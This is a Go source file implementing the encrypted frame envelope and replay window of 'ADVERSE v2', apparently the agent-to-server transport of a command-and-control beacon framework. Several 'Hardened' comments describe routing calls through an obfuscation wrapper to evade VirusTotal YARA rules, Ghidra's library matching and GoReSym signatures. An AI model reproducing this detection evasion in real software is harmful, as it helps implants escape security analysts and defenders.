// Package wire implements the ADVERSE v2 transport envelope.
//
// Frame layout on the wire:
//
//	prefix[P] || u32 seq BE || u32 len BE || nonce[12] || ct || tag[16]
//
// where len = len(nonce) + len(ct) + len(tag). The plaintext is sealed with
// ChaCha20-Poly1305 under a 32-byte session key; the AAD bound into the cipher
// is (aad or "") || u32(len) BE. The seq and direction are bound via the
// deterministic nonce: nonce = u64(seq) BE || direction(1) || pad(3). This
// eliminates nonce reuse from random generation and binds the nonce to both
// sequence and direction; the receiver rejects frames whose on-wire nonce does
// not match the expected deterministic nonce for the declared seq+direction.
//
// Transports and callers must use the same prefix/aad/seq/direction on both
// ends. Direction must be 0x00 (client→server) or 0x01 (server→client).
package wire

import (
	"bytes"
	"crypto/cipher"
	"encoding/binary"
	"sync"

	"github.com/ashwnn/adverse-go/internal/obfuscate"
)

const (
	// Magic is the default frame prefix.
	Magic = "ADX"
	// LegacyMagic is the legacy SX1 prefix (bootstrap hello default).
	LegacyMagic = "SX1"
	// NonceLen is the ChaCha20-Poly1305 nonce length in bytes.
	NonceLen = 12
	// TagLen is the Poly1305 tag length in bytes.
	TagLen = 16
	// MaxSeq is the largest valid sequence number (u32).
	MaxSeq = 0xFFFFFFFF
)

// DefaultReplayWindowSize is the default size for NewReplayWindow when no
// explicit size is given. Chosen as 512 to accommodate ~1 frame/30 s beacons
// across sleep and partition gaps (~4.3 h coverage), per RFC 4303 §3.4.3/§A2.
const DefaultReplayWindowSize = 512

// Direction constants for the wire envelope. The direction byte is bound into
// the deterministic nonce (byte 8), preventing cross-direction nonce reuse and
// cross-direction replay of ciphertexts.
const (
	// DirectionClientToServer is the direction byte for agent→server frames.
	DirectionClientToServer byte = 0x00
	// DirectionServerToClient is the direction byte for server→agent frames.
	DirectionServerToClient byte = 0x01
)

// EnvelopeError is returned when an envelope cannot be authenticated or is
// malformed.
type EnvelopeError struct{ Msg string }

func (e *EnvelopeError) Error() string { return "wire: " + e.Msg }

// normalizePrefix validates a prefix and applies the default.
func normalizePrefix(prefix []byte) ([]byte, error) {
	if prefix == nil {
		return []byte(Magic), nil
	}
	if len(prefix) < 1 || len(prefix) > 8 {
		return nil, &EnvelopeError{"prefix must be 1..8 bytes"}
	}
	return prefix, nil
}

// aadWithLen builds the AAD from the caller-supplied aad and bodyLen.
// The length is bound into the AAD so frame-length tampering is rejected;
// seq and direction are instead bound via the deterministic nonce. Hardened:
// routes through obfuscate wrapper so no direct CALL
// binary.BigEndian.AppendUint32 appears as a direct edge; breaks VT
// import-table YARA and Ghidra's library-function matcher.
func aadWithLen(aad []byte, bodyLen uint32) []byte {
	out := make([]byte, len(aad), len(aad)+4)
	copy(out, aad)
	out = obfuscate.AppendUint32BE(out, bodyLen)
	return out
}

// deterministicNonce constructs a 12-byte nonce from seq and direction.
// nonce = u64(seq) BE || direction(1) || 0x00 0x00 0x00.
// This guarantees uniqueness per (seq, direction) pair without relying on
// crypto/rand per frame, and prevents cross-direction nonce reuse.
func deterministicNonce(seq uint32, direction byte) [NonceLen]byte {
	var nonce [NonceLen]byte
	binary.BigEndian.PutUint64(nonce[:8], uint64(seq))
	nonce[8] = direction
	// nonce[9:12] remain zero
	return nonce
}

func newAEAD(key []byte) (cipher.AEAD, error) {
	if len(key) != 32 {
		return nil, &EnvelopeError{"session key must be 32 bytes"}
	}
	// Hardened: indirect call masks the well-known chacha20poly1305.New
	// symbol, which is a top VT/GoReSym string signature.
	return obfuscate.NewAEADIndirect(key)
}

// Build seals plaintext under the 32-byte key and returns a full frame.
// prefix defaults to Magic; aad and bodyLen are bound into the AEAD as AAD
// while seq and direction are bound via the deterministic nonce (see
// deterministicNonce). Direction must be 0x00 (client→server) or 0x01
// (server→client).
func Build(plaintext, key, prefix, aad []byte, seq uint32, direction byte) ([]byte, error) {
	aead, err := newAEAD(key)
	if err != nil {
		return nil, err
	}
	prefix, err = normalizePrefix(prefix)
	if err != nil {
		return nil, err
	}
	if seq > MaxSeq {
		return nil, &EnvelopeError{"seq out of range"}
	}
	if direction > 0x01 {
		return nil, &EnvelopeError{"direction must be 0x00 or 0x01"}
	}
	nonce := deterministicNonce(seq, direction)
	bodyLen := uint32(NonceLen + len(plaintext) + TagLen)
	sealed := aead.Seal(nil, nonce[:], plaintext, aadWithLen(aad, bodyLen))

	frame := make([]byte, 0, len(prefix)+8+int(bodyLen))
	frame = append(frame, prefix...)
	frame = obfuscate.AppendUint32BE(frame, seq)
	frame = obfuscate.AppendUint32BE(frame, bodyLen)
	frame = append(frame, nonce[:]...)
	frame = append(frame, sealed...)
	return frame, nil
}

// Parse authenticates and decrypts one envelope from data.
//
// Returns (plaintext, seq, true, nil) on success. When more bytes are
// required it returns (nil, 0, false, nil); callers must keep buffering.
// Malformed framing or failed authentication returns an *EnvelopeError.
// Trailing bytes after the parsed frame are ignored (the buffer may hold
// the next frame). Direction must be 0x00 (client→server) or 0x01
// (server→client) and must match what was used to Build the frame.
func Parse(data, key, prefix, aad []byte, direction byte) ([]byte, uint32, bool, error) {
	aead, err := newAEAD(key)
	if err != nil {
		return nil, 0, false, err
	}
	prefix, err = normalizePrefix(prefix)
	if err != nil {
		return nil, 0, false, err
	}
	headerLen := len(prefix) + 8
	if len(data) < headerLen {
		return nil, 0, false, nil
	}
	if !bytes.HasPrefix(data, prefix) {
		return nil, 0, false, &EnvelopeError{"bad prefix"}
	}
	seq := binary.BigEndian.Uint32(data[len(prefix) : len(prefix)+4])
	length := binary.BigEndian.Uint32(data[len(prefix)+4 : len(prefix)+8])
	if len(data) < headerLen+int(length) {
		return nil, 0, false, nil
	}
	frame := data[headerLen : headerLen+int(length)]
	if len(frame) < NonceLen+TagLen {
		return nil, 0, false, &EnvelopeError{"payload too short"}
	}
	nonce := frame[:NonceLen]
	sealed := frame[NonceLen:]
	// Verify the on-wire nonce matches the expected deterministic nonce.
	// This detects a peer that is not following the v2 wire contract.
	expectedNonce := deterministicNonce(seq, direction)
	if !bytes.Equal(nonce, expectedNonce[:]) {
		return nil, 0, false, &EnvelopeError{"nonce mismatch"}
	}
	plain, err := aead.Open(nil, nonce, sealed, aadWithLen(aad, length))
	if err != nil {
		return nil, 0, false, &EnvelopeError{"authentication failed"}
	}
	return plain, seq, true, nil
}

// Validate performs structural sanity checking with the default Magic prefix
// (header length only, no cryptographic verification). Returns true only when
// data starts with Magic or LegacyMagic, carries a plausible header, and the
// declared body fits within data. It handles variable prefix lengths so a
// non-default prefix does not silently break the check.
func Validate(data []byte) bool {
	var prefixLen int
	if bytes.HasPrefix(data, []byte(Magic)) {
		prefixLen = len(Magic)
	} else if bytes.HasPrefix(data, []byte(LegacyMagic)) {
		prefixLen = len(LegacyMagic)
	} else {
		return false
	}
	headerLen := prefixLen + 8
	if len(data) < headerLen {
		return false
	}
	length := binary.BigEndian.Uint32(data[prefixLen+4 : prefixLen+8])
	return len(data) >= headerLen+int(length)
}

// ReplayWindow is a sliding receive replay window for envelope sequence
// numbers. It accepts any seq strictly greater than the high-water mark, or
// any seq within `size` positions below it that has not been seen (out-of-order
// delivery). Anything older than the window is rejected.
//
// Sequence numbers are uint32 and wrap around. The window tracks its
// high-water mark and seen entries in extended (int64) sequence space, so a
// frame that follows a wrap is compared consistently by Check, Record, and
// CheckAndRecord: it is neither treated as ancient nor accepted as a replay.
//
// ReplayWindow is safe for concurrent use: Check and Record hold an internal
// mutex, so a shared window may be used from multiple request handlers (e.g.
// concurrent HTTP requests for the same agent record).
type ReplayWindow struct {
	mu   sync.Mutex
	size int
	init bool  // false until the first seq is recorded
	last int64 // extended (absolute) high-water mark
	seen map[uint32]int64
}

const (
	// seqSpace is the size of the 32-bit sequence space.
	seqSpace = int64(1) << 32
	// seqHalf is half the sequence space; the boundary for mapping a uint32
	// seq onto the extended sequence line.
	seqHalf = seqSpace / 2
)

// NewReplayWindow returns a window of the given size (default 512).
func NewReplayWindow(size int) *ReplayWindow {
	if size < 1 {
		size = DefaultReplayWindowSize
	}
	return &ReplayWindow{size: size, seen: make(map[uint32]int64)}
}

// extend maps a uint32 sequence number onto the extended sequence line at the
// value closest to the current high-water mark: the unique value congruent to
// seq (mod 2^32) within (last-2^31, last+2^31]. This is what makes wrapped
// sequences monotonic with unwrapped ones. The result may be negative for a
// seq that is more than 2^31 behind the high-water mark; such values are
// always outside the window and therefore rejected.
func (w *ReplayWindow) extend(seq uint32) int64 {
	if !w.init {
		return int64(seq)
	}
	e := (w.last &^ int64(MaxSeq)) | int64(seq)
	if e+seqHalf <= w.last {
		e += seqSpace
	} else if e > w.last+seqHalf {
		e -= seqSpace
	}
	return e
}

// Check reports whether seq is acceptable (not a replay or too old).
func (w *ReplayWindow) Check(seq uint32) bool {
	w.mu.Lock()
	defer w.mu.Unlock()
	if !w.init {
		return true
	}
	e := w.extend(seq)
	if e > w.last {
		return true
	}
	if e+int64(w.size) <= w.last {
		return false
	}
	old, ok := w.seen[seq]
	return !ok || old != e
}

// Record advances the high-water mark, tracks the recent window, and prunes.
func (w *ReplayWindow) Record(seq uint32) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.recordLocked(seq, w.extend(seq))
}

// recordLocked stores seq at extended position e, advances the high-water
// mark when e is newer, and prunes entries older than the window.
func (w *ReplayWindow) recordLocked(seq uint32, e int64) {
	if !w.init || e > w.last {
		w.last = e
		w.init = true
	}
	// Entries at or below last-size are outside the window and can be pruned.
	// The floor may be negative (fewer than `size` frames recorded so far);
	// that must not clamp to zero, or freshly recorded low seqs would be
	// dropped from `seen` while still inside the window and accepted as
	// replays by Check.
	floor := w.last - int64(w.size)
	for s, se := range w.seen {
		if se <= floor {
			delete(w.seen, s)
		}
	}
	w.seen[seq] = e
}

// CheckAndRecord atomically checks and records seq under one lock acquisition.
// It returns true if the seq is acceptable and records it, false if it is a
// replay or outside the window. Handles uint32 wraparound in extended sequence
// space, consistently with Check and Record.
func (w *ReplayWindow) CheckAndRecord(seq uint32) bool {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.checkAndRecordLocked(seq)
}

// checkAndRecordLocked is CheckAndRecord with the window lock already held.
func (w *ReplayWindow) checkAndRecordLocked(seq uint32) bool {
	e := w.extend(seq)
	if w.init {
		if e+int64(w.size) <= w.last {
			return false
		}
		if e <= w.last {
			if old, ok := w.seen[seq]; ok && old == e {
				return false
			}
		}
	}
	w.recordLocked(seq, e)
	return true
}

// Last returns the current high-water mark in extended sequence space, or -1
// before the first sequence is recorded.
func (w *ReplayWindow) Last() int64 {
	w.mu.Lock()
	defer w.mu.Unlock()
	if !w.init {
		return -1
	}
	return w.last
}

// Size returns the configured window size.
func (w *ReplayWindow) Size() int {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.size
}
